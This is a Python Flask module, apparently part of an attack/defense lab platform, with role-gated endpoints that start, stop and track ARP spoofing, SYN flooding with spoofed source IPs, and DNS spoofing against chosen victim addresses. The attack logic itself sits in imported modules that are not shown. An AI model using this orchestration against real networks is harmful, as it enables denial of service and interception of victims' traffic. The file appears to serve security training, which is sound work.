"""
Attack Routes - ARP Spoofing, SYN Flooding, DNS Spoofing
Flask Blueprint for attack endpoints
"""

from flask import Blueprint, request, jsonify, session
from functools import wraps
import threading
import uuid
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.arp_spoof import ARPSpoofer
from modules.syn_flood import SYNFlooder
from modules.dns_spoof_nfqueue import DNSSpooferNFQueue
import models
from models import active_attacks, log_attack

attacks_bp = Blueprint('attacks', __name__)


# ============================================================================
# MIDDLEWARE: Check User Role
# ============================================================================

def require_attacker(f):
    """Decorator to require attacker role"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('user_role') != 'ATTACKER':
            return jsonify({'error': 'Access denied'}), 403
        return f(*args, **kwargs)
    return decorated_function


# ============================================================================
# ARP SPOOFING ENDPOINTS
# ============================================================================

@attacks_bp.route('/arp/start', methods=['POST'])
@require_attacker
def start_arp_attack():
    """Start ARP spoofing attack"""
    try:
        data = request.get_json()
        victim_ip = data.get('target_ip')
        gateway_ip = data.get('gateway_ip')
        interface = data.get('interface') or 'eth0'
        interval = data.get('interval', 2)
        
        # Validate
        if not victim_ip or not gateway_ip:
            return jsonify({'error': 'Missing parameters: target_ip, gateway_ip'}), 400
        
        # Create unique attack ID
        attack_id = f"arp_{victim_ip}_{gateway_ip}"
        
        # Check if already running
        if attack_id in active_attacks:
            return jsonify({'error': 'Attack already running'}), 400
        
        # Create ARP spoofer
        spoofer = ARPSpoofer(victim_ip, gateway_ip, interface)
        
        # Start in background thread
        def run_attack():
            try:
                # Use ARPSpoofer.start_attack (per module API) instead of non-existent start
                spoofer.start_attack(interval=interval)
            except Exception as e:
                print(f"ARP Attack Error: {e}")
        
        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()
        
        # Store in memory
        active_attacks[attack_id] = {
            'object': spoofer,
            'type': 'ARP',
            'target_ip': victim_ip,
            'gateway_ip': gateway_ip,
            'packets_sent': 0,
            'status': 'running'
        }
        
        # Log attack
        log_attack('ARP_SPOOFING', victim_ip, gateway_ip, 'running')
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'message': f'ARP spoofing attack started against {victim_ip}'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@attacks_bp.route('/arp/stop', methods=['POST'])
@require_attacker
def stop_arp_attack():
    """Stop ARP spoofing attack"""
    try:
        data = request.get_json()
        attack_id = data.get('attack_id')
        
        if attack_id not in active_attacks:
            return jsonify({'error': 'Attack not found'}), 404
        
        attack_info = active_attacks[attack_id]
        spoofer = attack_info['object']
        
        # Stop attack
        # Use ARPSpoofer.stop_attack to restore ARP tables properly
        spoofer.stop_attack()
        
        # Remove from active attacks
        del active_attacks[attack_id]
        
        # Log
        log_attack('ARP_SPOOFING', attack_info['target_ip'], attack_info['gateway_ip'], 'stopped')
        
        return jsonify({
            'status': 'stopped',
            'message': 'ARP attack stopped and ARP tables restored'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================================
# SYN FLOODING ENDPOINTS
# ============================================================================

@attacks_bp.route('/syn/start', methods=['POST'])
@require_attacker
def start_syn_attack():
    """Start SYN flooding attack"""
    try:
        data = request.get_json()
        target_ips = data.get('target_ips') or []
        target_ip_single = data.get('target_ip')
        if target_ip_single:
            target_ips.append(target_ip_single)
        target_ports = data.get('target_ports') or []
        if not target_ports and data.get('target_port'):
            target_ports.append(int(data.get('target_port')))
        if not target_ports:
            target_ports = [80]
        num_threads = data.get('threads', 10)
        rate_limit = data.get('rate_limit_pps')
        spoof_pool = data.get('spoof_ips') or []
        random_spoof_count = int(data.get('random_spoof_count') or 0)
        
        # Validate
        if not target_ips:
            return jsonify({'error': 'Missing parameter: target_ip or target_ips'}), 400
        
        # Create unique attack ID
        attack_id = f"syn_{target_ips[0]}_{target_ports[0]}"
        
        # Check if already running
        if attack_id in active_attacks:
            return jsonify({'error': 'Attack already running'}), 400
        
        # Create SYN flooder
        flooder = SYNFlooder(
            target_ips,
            target_ports,
            num_threads,
            spoof_pool=spoof_pool,
            rate_limit_pps=rate_limit,
            spoof_pool_size=random_spoof_count,
        )
        
        # Start in background thread
        def run_attack():
            try:
                flooder.start()
            except Exception as e:
                print(f"SYN Flood Error: {e}")
        
        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()
        
        # Store in memory
        active_attacks[attack_id] = {
            'object': flooder,
            'type': 'SYN',
            'target_ip': ','.join(target_ips),
            'target_port': ','.join(map(str, target_ports)),
            'packets_sent': 0,
            'status': 'running'
        }
        
        # Log attack
        log_attack('SYN_FLOODING', ','.join(target_ips), None, 'running')
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'message': f'SYN flooding attack started against {','.join(target_ips)}:{','.join(map(str,target_ports))}'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@attacks_bp.route('/syn/stop', methods=['POST'])
@require_attacker
def stop_syn_attack():
    """Stop SYN flooding attack"""
    try:
        data = request.get_json()
        attack_id = data.get('attack_id')
        
        if attack_id not in active_attacks:
            return jsonify({'error': 'Attack not found'}), 404
        
        attack_info = active_attacks[attack_id]
        flooder = attack_info['object']
        
        # Stop attack
        flooder.stop()
        
        # Remove from active attacks
        del active_attacks[attack_id]
        
        # Log
        log_attack('SYN_FLOODING', attack_info['target_ip'], None, 'stopped')
        
        return jsonify({
            'status': 'stopped',
            'message': 'SYN flooding attack stopped'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================================
# DNS SPOOFING ENDPOINTS
# ============================================================================

@attacks_bp.route('/dns/start', methods=['POST'])
@require_attacker
def start_dns_attack():
    """Start DNS spoofing server targeting specific victim"""
    try:
        data = request.get_json()
        victim_ip = data.get('victim_ip')
        attacker_ip = data.get('attacker_ip')
        target_domains = data.get('target_domains', ['google.com', 'facebook.com'])
        interface = data.get('interface')
        
        # Validate
        if not victim_ip:
            return jsonify({'error': 'Missing parameter: victim_ip'}), 400
        if not attacker_ip:
            return jsonify({'error': 'Missing parameter: attacker_ip'}), 400
        
        # Create unique attack ID (victim-specific)
        attack_id = f"dns_{victim_ip}_{attacker_ip}"
        
        # Check if already running
        if attack_id in active_attacks:
            return jsonify({'error': 'DNS attack on this victim already running'}), 400
        
        # Log the attack startup
        import sys
        print(f"\n🌐 DNS ATTACK STARTING:", file=sys.stderr)
        print(f"   Victim IP: {victim_ip}", file=sys.stderr)
        print(f"   Attacker IP: {attacker_ip}", file=sys.stderr)
        print(f"   Domains: {target_domains}", file=sys.stderr)
        print(f"   Interface: {interface or 'default'}", file=sys.stderr)
        
        # Create DNS spoofer using NetfilterQueue
        spoofer = DNSSpooferNFQueue(
            attacker_ip=attacker_ip,
            target_domains=target_domains,
            victim_ip=victim_ip,
            queue_num=0
        )
        
        # Start spoofer in background thread
        def run_spoofer():
            try:
                spoofer.start_attack()
            except Exception as e:
                print(f"❌ DNS Spoofer Error: {e}", file=sys.stderr)
        
        thread = threading.Thread(target=run_spoofer, daemon=True)
        thread.start()
        
        # Store in memory
        active_attacks[attack_id] = {
            'object': spoofer,
            'type': 'DNS',
            'victim_ip': victim_ip,
            'attacker_ip': attacker_ip,
            'target_domains': target_domains,
            'target_ip': victim_ip,  # For UI consistency
            'packets_spoofed': 0,
            'status': 'running'
        }
        
        # Log attack
        log_attack('DNS_SPOOFING', victim_ip, ','.join(target_domains), 'running')
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'message': f'DNS spoofing server started: {victim_ip} → {attacker_ip} for {", ".join(target_domains)}',
            'victim_ip': victim_ip,
            'target_domains': target_domains
        }), 200
    
    except Exception as e:
        import sys
        print(f"❌ DNS ATTACK ERROR: {e}", file=sys.stderr)
        return jsonify({'error': str(e)}), 500


@attacks_bp.route('/dns/stop', methods=['POST'])
@require_attacker
def stop_dns_attack():
    """Stop DNS spoofing server"""
    try:
        data = request.get_json()
        attack_id = data.get('attack_id') or list(
            [k for k, v in active_attacks.items() if v['type'] == 'DNS']
        )[0] if any(v['type'] == 'DNS' for v in active_attacks.values()) else None
        
        if not attack_id or attack_id not in active_attacks:
            return jsonify({'error': 'Attack not found'}), 404
        
        attack_info = active_attacks[attack_id]
        spoofer = attack_info['object']
        
        # Stop spoofer
        spoofer.stop_attack()
        
        # Update memory
        del active_attacks[attack_id]
        
        return jsonify({
            'status': 'stopped',
            'message': f'DNS spoofing stopped',
            'packets_spoofed': spoofer.packets_spoofed
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================================
# ATTACK STATISTICS
# ============================================================================

@attacks_bp.route('/stats', methods=['GET'])
@require_attacker
def get_attack_stats():
    """Get statistics on running attacks"""
    try:
        attacks = {}
        
        for attack_id, attack_info in active_attacks.items():
            target_ip = attack_info.get('target_ip') or attack_info.get('victim_ip') or attack_info.get('attacker_ip')
            is_blocked = target_ip in models.blocked_ips
            
            # Get packet count - DNS attacks track packets_spoofed, others track packets_sent
            packets = attack_info.get('packets_sent', 0) or attack_info.get('packets_spoofed', 0)
            
            # For DNS attacks, get live count from object
            if attack_info['type'] == 'DNS' and 'object' in attack_info:
                try:
                    packets = attack_info['object'].packets_spoofed
                except:
                    packets = 0
            
            # Attack is successful if running and not blocked
            success = attack_info['status'] == 'running' and not is_blocked
            
            attack_stat = {
                'type': attack_info['type'],
                'target_ip': target_ip,
                'packets_sent': packets,
                'status': attack_info['status'],
                'is_blocked': is_blocked,
                'success': success,  # Running and not blocked = working
            }
            
            # Add DNS-specific fields
            if attack_info['type'] == 'DNS':
                attack_stat['victim_ip'] = attack_info.get('victim_ip')
                attack_stat['attacker_ip'] = attack_info.get('attacker_ip')
                attack_stat['target_domains'] = attack_info.get('target_domains', [])
            
            attacks[attack_id] = attack_stat
        
        return jsonify({'attacks': attacks}), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@attacks_bp.route('/dns/test', methods=['GET'])
@require_attacker
def test_dns_server():
    """Test if DNS server is running and can receive queries"""
    try:
        import socket
        import sys
        
        dns_attacks = [v for v in active_attacks.values() if v['type'] == 'DNS']
        
        if not dns_attacks:
            return jsonify({
                'status': 'no_attack',
                'message': 'No DNS attack running'
            }), 200
        
        attack = dns_attacks[0]
        server = attack['object']
        
        test_result = {
            'attack_running': server.is_running,
            'packets_spoofed': server.packets_spoofed,
            'attacker_ip': server.attacker_ip,
            'target_domains': list(server.target_domains),
            'iptables_rules_added': server.iptables_rules_added,
            'message': 'DNS server is running'
        }
        
        # Check if port 53 is listening
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0.5)
            # Try to send a test DNS query
            test_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
            s.sendto(test_query, (server.attacker_ip, 53))
            
            try:
                response, _ = s.recvfrom(512)
                test_result['port_53_test'] = 'Received response'
                test_result['test_success'] = True
            except socket.timeout:
                test_result['port_53_test'] = 'No response on port 53'
                test_result['test_success'] = False
            finally:
                s.close()
        except Exception as e:
            test_result['port_53_test'] = f'Test failed: {e}'
            test_result['test_success'] = False
        
        return jsonify(test_result), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500
